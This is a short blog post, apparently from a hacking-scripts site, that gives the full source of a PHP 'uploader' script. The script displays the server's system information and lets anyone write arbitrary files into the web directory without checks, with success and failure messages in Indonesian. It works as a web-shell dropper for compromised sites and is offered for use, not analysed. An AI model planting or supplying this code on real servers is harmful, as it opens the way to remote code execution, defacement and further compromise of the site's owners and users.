---
id: 66
title: Uploader Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=66
permalink: /uploader-script/
categories:
  - PHP
  - Upload
tags:
  - PHP
  - uploader
---
This is a very basic uploader script, which simply enables the user to upload whatever they want to the server.

### Uploader Script Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
echo '&lt;b&gt;&lt;br&gt;&lt;br&gt;'.php_uname().'&lt;br&gt;&lt;/b&gt;';
echo '&lt;form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"&gt;';
echo '&lt;input type="file" name="file" size="50"&gt;&lt;input name="_upl" type="submit" id="_upl" value="Upload"&gt;&lt;/form&gt;';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '&lt;b&gt;Upload SUKSES !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;'; }
    else { echo '&lt;b&gt;Upload GAGAL !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;'; }
}
?&gt;
</pre>

### Uploader Script Screenshot

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/01/uploader.png" alt="uploader script screenshot" width="495" height="108" class="aligncenter size-full wp-image-333" />][1]

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/01/uploader.png